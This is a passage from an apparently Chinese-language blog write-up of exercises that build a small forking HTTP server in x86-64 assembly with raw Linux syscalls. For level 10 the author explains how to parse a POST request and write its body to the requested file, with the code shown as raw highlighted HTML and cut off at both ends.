class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # read(<span class="hljs-number">4</span>,buf,count_bytes)<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">256</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer+<span class="hljs-number">4</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path<br><span class="hljs-symbol">loop_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-string">&#x27; &#x27;</span><br>    <span class="hljs-keyword">je</span> get_file_path<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop_start<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_file_path:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path # open(<span class="hljs-string">&quot;file_path&quot;</span>, O_RDONLY)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>              # read(the_file,buf,<span class="hljs-number">256</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">256</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span> <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">rax</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # close(<span class="hljs-number">5</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="hljs-number">19</span>) = <span class="hljs-number">19</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span> + ret_normal_msg] <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;file_buf&quot;</span>, <span class="hljs-built_in">r8</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">r8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # close(<span class="hljs-number">4</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">done:</span><br><span class="hljs-meta">    </span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">ret_normal_msg:</span><br><span class="hljs-meta">    .ascii</span> <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="hljs-symbol">buffer:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">256</span><br><span class="hljs-symbol">file_path:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">64</span> <br><br></code></pre></td></tr></table></figure>



<h4 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h4><p>这一关，还挺折磨的。对于客户端发来的信息：</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-string">&quot;POST /tmp/tmpgjb407yq HTTP/1.1<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Host: localhost<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>User-Agent: python-requests/2.32.3<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Accept-Encoding: gzip, deflate, zstd<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Accept: */*<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection: keep-alive<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length: 65<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>K8rWGbWjWUycQmhKDinJRKVnmTd1ssEfnNbxuzygIK4l1pIVgCGgSx0Kdr3xqIFWK&quot;</span><br></code></pre></td></tr></table></figure>

<p>需要解析出length和这个随机字符串。因为后续需要通过write写入文件<code>/tmp/xxx</code>。所以，我想到的方法是将这个字符串存入buffer，然后从buffer的最后一个字节开始逆序遍历，到第一个<code>\n</code>停止。这样可以拿到这个随机字符串的逆序，以及用一个寄存器记录一下长度。后续再通过这个长度来再一次逆序这个随机字符串，从而写入<code>/tmp/xxx</code>。最终代码如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # bind(<span class="hljs-number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="hljs-number">80</span>), sin_addr=inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="hljs-number">16</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # listen(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span><br>    <span class="hljs-keyword">syscall</span> <br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">57</span>     # fork()<br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">je</span> child_process<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # close(<span class="hljs-number">4</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">jmp</span> done<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">child_process:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # close(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # read(<span class="hljs-number">4</span>,buf,count_bytes)<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">512</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer+<span class="hljs-number">5</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path<br><span class="hljs-symbol">loop_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">je</span> get_file_path<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop_start<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_file_path:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path  # open(<span class="hljs-string">&quot;file_path&quot;</span>, O_WRONLY|O_CREAT, <span class="hljs-number">0777</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">01</span>|<span class="hljs-number">0100</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0x1FF</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, content<br>    <span class="hljs-keyword">dec</span> <span class="hljs-built_in">r8</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">loop2_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [buffer + <span class="hljs-built_in">r8</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0xa</span><br>    <span class="hljs-keyword">je</span> get_content_str<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">dec</span> <span class="hljs-built_in">r8</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">jmp</span> loop2_start<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_content_str:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, reverse_content<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">dec</span> <span class="hljs-built_in">r9</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">loop3_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [content + <span class="hljs-built_in">r9</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">je</span> get_reverse_str<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">dec</span> <span class="hljs-built_in">r9</span><br>    <span class="hljs-keyword">jmp</span> loop3_start<br><span class="hljs-symbol">get_reverse_str:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # write(<span class="hljs-number">3</span>, content, content_length)<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, reverse_content<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # close(<span class="hljs-number">3</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="hljs-number">19</span>) = <span class="hljs-number">19</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span> + ret_normal_msg] <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">done:</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">ret_normal_msg:</span><br><span class="hljs-meta">    .ascii</span> <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="hljs-symbol">buffer:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">512</span><br><span class="hljs-symbol">file_path:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">64</span> <br><span class="hljs-symbol">content:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">256</span><br><span class="hljs-symbol">reverse_content:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">256</span><br><br></code></pre></td></tr></table></figure>

<p>总共三个循环，还是挺复杂的。主要是有更简单的方法。<code>!</code>使用<code>\n</code>的索引即可。如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # bind(<span class="hljs-number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="hljs-number">80</span>), sin_addr=inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="hljs-number">16</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # listen(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span><br>    <span class="hljs-keyword">syscall</span> <br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">57</span>     # fork()<br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">je</span> child_process<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # close(<span class="hljs-number">4</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">jmp</span> done<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">child_process:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span 